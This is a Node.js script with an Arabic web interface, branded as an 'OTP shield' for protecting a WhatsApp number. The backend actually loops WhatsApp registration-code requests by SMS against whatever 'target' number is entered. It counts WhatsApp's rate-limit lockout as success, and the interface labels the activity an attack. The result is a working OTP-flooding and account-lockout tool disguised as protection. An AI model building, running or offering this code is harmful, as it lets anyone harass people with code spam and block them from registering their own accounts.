/**
 * 👑 TARZAN OTP SHIELD - THE GREATNESS EDITION 👑
 * نظام توثيق وحماية الأرقام عبر قفل خدمة الـ OTP
 * --------------------------------------------------
 * المتطلبات:
 * npm install @whiskeysockets/baileys pino express
 */

const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    pino 
} = require('@whiskeysockets/baileys');
const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// ==========================================
// 🎨 واجهة المستخدم (النسخة العظمى)
// ==========================================
const htmlInterface = `
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>𝑻𝑨𝑹𝒁𝑨𝑵 𝑶𝑻𝑷 𝑺𝑯𝑰𝑬𝑳𝑫</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
        body { font-family: 'Cairo', sans-serif; background-color: #050505; color: #fff; }
        .neon-border { box-shadow: 0 0 15px rgba(59, 130, 246, 0.5); border: 1px solid rgba(59, 130, 246, 0.5); }
        .glass { background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.05); }
        .status-active { color: #10b981; text-shadow: 0 0 10px #10b981; }
        .status-waiting { color: #f59e0b; text-shadow: 0 0 10px #f59e0b; }
        .log-entry { border-right: 2px solid #3b82f6; padding-right: 10px; margin-bottom: 5px; font-family: monospace; font-size: 0.8rem; }
    </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-center p-4">

    <div class="max-w-4xl w-full space-y-6">
        <!-- Header -->
        <div class="text-center space-y-2">
            <h1 class="text-5xl font-extrabold tracking-tighter text-blue-500 italic">𝑻𝑨𝑹𝒁𝑨𝑵 𝑽𝑰𝑷</h1>
            <p class="text-gray-400">نظام حماية وتوثيق الأرقام من السرقة (OTP Lockdown)</p>
        </div>

        <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
            <!-- Control Panel -->
            <div class="md:col-span-2 glass p-8 rounded-3xl neon-border space-y-6">
                <div class="space-y-4">
                    <label class="block text-sm font-bold text-blue-400">رقم الهاتف المستهدف للحماية:</label>
                    <div class="relative">
                        <input type="text" id="phone" placeholder="967733..." class="w-full bg-white/5 border border-white/10 p-4 rounded-xl focus:outline-none focus:border-blue-500 text-xl tracking-widest transition-all">
                        <i class="fas fa-shield-halved absolute left-4 top-1/2 -translate-y-1/2 text-blue-500"></i>
                    </div>
                </div>

                <div class="flex gap-4">
                    <button onclick="startShield()" id="startBtn" class="flex-1 bg-blue-600 hover:bg-blue-700 py-4 rounded-xl font-bold text-lg transition-all active:scale-95 flex items-center justify-center gap-2">
                        <i class="fas fa-bolt"></i> تفعيل الدرع العظيم
                    </button>
                    <button onclick="stopShield()" id="stopBtn" class="bg-red-600/20 hover:bg-red-600 text-red-500 hover:text-white px-6 rounded-xl transition-all disabled:opacity-50" disabled>
                        <i class="fas fa-power-off"></i>
                    </button>
                </div>

                <!-- Live Status -->
                <div class="grid grid-cols-2 gap-4">
                    <div class="bg-white/5 p-4 rounded-2xl border border-white/5 text-center">
                        <p class="text-xs text-gray-500 mb-1">حالة السيرفر</p>
                        <p id="serverStatus" class="font-bold text-green-500">متصل</p>
                    </div>
                    <div class="bg-white/5 p-4 rounded-2xl border border-white/5 text-center">
                        <p class="text-xs text-gray-500 mb-1">وقت الانتظار الفعلي</p>
                        <p id="waitTimer" class="font-bold text-blue-500">00:00</p>
                    </div>
                </div>
            </div>

            <!-- Side Logs -->
            <div class="glass p-6 rounded-3xl border border-white/5 flex flex-col h-[400px]">
                <h3 class="text-sm font-bold text-gray-500 mb-4 uppercase"><i class="fas fa-terminal ml-2"></i>سجل الحماية</h3>
                <div id="logs" class="flex-1 overflow-y-auto space-y-2 text-xs">
                    <div class="text-blue-400 log-entry">نظام طرزان جاهز للعمل...</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let interval = null;

        async function startShield() {
            const phone = document.getElementById('phone').value;
            if(!phone) return alert('أدخل الرقم يا زعيم! 😈');

            document.getElementById('startBtn').disabled = true;
            document.getElementById('startBtn').innerHTML = '<i class="fas fa-circle-notch animate-spin"></i> جاري الهجوم الأمني...';
            document.getElementById('stopBtn').disabled = false;

            addLog("بدء تشغيل بروتوكول الحماية للرقم: " + phone, "text-blue-400");

            const response = await fetch('/start', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ phone })
            });
            
            const data = await response.json();
            updateDisplay(data);
            
            // تحديث دوري للحالة
            interval = setInterval(async () => {
                const res = await fetch('/status');
                const statusData = await res.json();
                updateDisplay(statusData);
            }, 3000);
        }

        async function stopShield() {
            clearInterval(interval);
            await fetch('/stop', { method: 'POST' });
            location.reload();
        }

        function updateDisplay(data) {
            if(data.log) addLog(data.log, data.color);
            if(data.wait) document.getElementById('waitTimer').innerText = data.wait;
            if(data.status) document.getElementById('serverStatus').innerText = data.status;
        }

        function addLog(msg, color) {
            const logDiv = document.getElementById('logs');
            const entry = document.createElement('div');
            entry.className = "log-entry " + (color || "text-gray-400");
            entry.innerText = msg;
            logDiv.prepend(entry);
        }
    </script>
</body>
</html>
`;

// ==========================================
// 🚀 المحرك الخلفي (Logic)
// ==========================================

let shieldActive = false;
let currentPhone = "";
let lastStatus = { wait: "00:00", log: "جاهز", color: "text-blue-400", status: "مستقر" };

app.get('/', (req, res) => res.send(htmlInterface));

app.post('/start', async (req, res) => {
    const { phone } = req.body;
    currentPhone = phone;
    shieldActive = true;
    
    // بدء عملية الـ Lockdown في الخلفية
    runShield(phone);
    
    res.json({ log: "تم حقن الأوامر في سيرفرات واتساب...", color: "text-yellow-500" });
});

app.post('/stop', (req, res) => {
    shieldActive = false;
    res.json({ success: true });
});

app.get('/status', (req, res) => {
    res.json(lastStatus);
});

async function runShield(phone) {
    const { state } = await useMultiFileAuthState('shield_auth');
    const sock = makeWASocket({
        auth: state,
        logger: pino({ level: 'silent' }),
    });

    while (shieldActive) {
        try {
            console.log(`[SHIELD] Requesting OTP for ${phone}`);
            // طلب كود تسجيل (Registration Code) عبر SMS
            const result = await sock.requestRegistrationCode({
                phoneNumber: phone,
                phoneNumberCountryCode: phone.substring(0, 3), // افتراضي لأول 3 أرقام
                phoneNumberNationalNumber: phone.substring(3),
                method: 'sms'
            });

            lastStatus = {
                wait: "طلب ناجح",
                log: "تم إرسال نبضة OTP بنجاح.. جاري التكرار القاتل.",
                color: "text-green-500",
                status: "هجوم نشط"
            };

        } catch (err) {
            // هنا يكمن السر: عندما يرفض واتساب الطلب ويعطي وقت انتظار
            let reason = err.data?.reason || "Unknown";
            let waitTime = err.data?.value || "5 min";

            lastStatus = {
                wait: waitTime + " ثانية",
                log: `⚠️ نجاح! واتساب أغلق الخدمة. السبب: ${reason}`,
                color: "text-red-500",
                status: "تم الحظر بنجاح"
            };
            
            // إذا حصلنا على وقت انتظار طويل، ننتظر قليلاً ثم نعيد الكرة لنبقي الرقم "مقفل"
            await new Promise(r => setTimeout(r, 10000));
        }
        
        // تأخير بسيط بين المحاولات
        await new Promise(r => setTimeout(r, 5000));
    }
}

app.listen(PORT, () => console.log(`✅ Tarzan Shield VIP Live on port ${PORT}`));
